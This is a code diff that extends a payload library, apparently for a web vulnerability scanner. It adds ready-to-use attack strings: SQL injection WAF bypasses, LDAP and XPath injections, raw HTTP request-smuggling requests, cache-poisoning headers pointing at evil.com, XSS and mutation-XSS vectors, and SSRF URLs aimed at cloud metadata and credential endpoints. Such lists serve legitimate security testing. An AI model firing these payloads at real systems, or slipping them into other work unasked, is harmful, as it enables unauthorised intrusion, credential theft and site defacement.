@@ -313,6 +313,82 @@ class Payloads:
         "'; INSERT INTO users(username,password) VALUES('hacked','hacked'); --",
     ]
 
+    # Advanced SQLi - WAF Bypass techniques
+    SQLI_WAF_BYPASS = [
+        # MySQL versioned comments
+        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --",
+        "' /*!50000UNION*/ ALL /*!50000SELECT*/ NULL,NULL,NULL --",
+        # Inline comment splitting
+        "' UN/**/ION SEL/**/ECT 1,2,3 --",
+        "' UNI%0bON SEL%0bECT 1,2,3 --",
+        # Case randomization
+        "' uNiOn SeLeCt 1,2,3 --",
+        "' UnIoN sElEcT NULL,NULL,NULL --",
+        # Whitespace alternatives
+        "' UNION%09SELECT%091,2,3 --",
+        "' UNION%0aSELECT%0a1,2,3 --",
+        "' UNION%0dSELECT%0d1,2,3 --",
+        "' UNION%0bSELECT%0b1,2,3 --",
+        # Scientific notation
+        "' OR 1e0=1e0 --",
+        "' AND 1e0=1e0 --",
+        # LIKE/REGEXP alternatives
+        "' OR 1 LIKE 1 --",
+        "' OR 'a' REGEXP 'a' --",
+        # Double encoding
+        "' %252f%252a*/UNION%252f%252a*/SELECT 1,2,3 --",
+        # Parenthesis wrapping
+        "' UNION (SELECT 1,2,3) --",
+        "' AND (1)=(1) --",
+    ]
+
+    # LDAP Injection
+    LDAP_PAYLOADS = [
+        "*)(uid=*))(|(uid=*",
+        "*)(&", "*## ",
+        "*()|%26'", "admin)(&)",
+        "admin)(!(&(1=0", "*()|&'",
+        "*)(|(password=*)",
+        "admin)(|(objectClass=*))",
+        "*))%00",
+    ]
+
+    # XPath Injection
+    XPATH_PAYLOADS = [
+        "' or '1'='1", "' or ''='", "x' or 1=1 or 'x'='y",
+        "1 or 1=1", "' or 1=1 or ''='",
+        "') or ('1'='1", "' or count(parent::*[position()=1])=0 or 'a'='b",
+        "' or substring(name(parent::*[position()=1]),1,1)='a' or 'a'='b",
+        "1' or '1'='1' or '1'='1", "admin' or '1'='1",
+    ]
+
+    # HTTP Request Smuggling
+    HTTP_SMUGGLING_PAYLOADS = [
+        # CL.TE
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
+        # TE.CL
+        "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
+        # TE.TE obfuscation
+        "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n",
+        # H2.CL
+        "POST / HTTP/2\r\nHost: {host}\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
+    ]
+
+    # Cache Poisoning
+    CACHE_POISONING_PAYLOADS = [
+        # Unkeyed headers
+        "X-Forwarded-Host: evil.com",
+        "X-Forwarded-Scheme: nothttps",
+        "X-Original-URL: /admin",
+        "X-Rewrite-URL: /admin",
+        "X-Forwarded-Proto: nothttps",
+        # Parameter pollution
+        "?cb=1&utm_content=x",
+        "?x=1%23",
+        # Fat GET
+        "GET /?param=normal HTTP/1.1\r\nContent-Length: 50\r\n\r\nparam=poisoned",
+    ]
+
     # Advanced XSS - DOM-based
     XSS_DOM_PAYLOADS = [
         "#<img src=x onerror=alert(1)>",
@@ -329,6 +405,17 @@ class Payloads:
         "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik;alert(1)//",
         "'\"-->]]>*/</script></style></noscript></xmp></textarea><img src=x onerror=alert(1)>",
         "-->'\"\\><img src=x onerror=alert(1)>",
+        # Modern mXSS
+        "<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}</style>",
+        # Mutation-based
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        # Modern event handlers
+        "<video><source onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<select autofocus onfocus=alert(1)>",
+        "<textarea autofocus onfocus=alert(1)>",
+        "<keygen autofocus onfocus=alert(1)>",
     ]
 
     # Advanced SSRF - Cloud metadata
@@ -341,6 +428,18 @@ class Payloads:
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "http://100.100.100.200/latest/meta-data/",
         "http://169.254.170.2/v2/credentials",
+        # DigitalOcean
+        "http://169.254.169.254/metadata/v1/",
+        "http://169.254.169.254/metadata/v1/hostname",
+        # Alibaba Cloud
+        "http://100.100.100.200/latest/meta-data/instance-id",
+        "http://100.100.100.200/latest/meta-data/image-id",
+        # Kubernetes
+        "https://kubernetes.default.svc/api/v1/namespaces",
+        "https://kubernetes.default.svc/api/v1/pods",
+        # Oracle Cloud
+        "http://169.254.169.254/opc/v2/instance/",
+        "http://169.254.169.254/opc/v1/instance/metadata/",
     ]
 
     # CRLF Injection
@@ -425,6 +524,7 @@ MITRE_CWE_MAP = {
     "Race Condition": ("T1496", "CWE-362"),
     "Prototype Pollution": ("T1059", "CWE-915"),
     "HTTP Request Smuggling": ("T1505", "CWE-444"),
+    "HTTP Smuggling": ("T1190", "CWE-444"),
     "GraphQL Injection": ("T1190", "CWE-89"),
     "JWT Weakness": ("T1550", "CWE-347"),
     "CORS Misconfiguration": ("T1550", "CWE-942"),
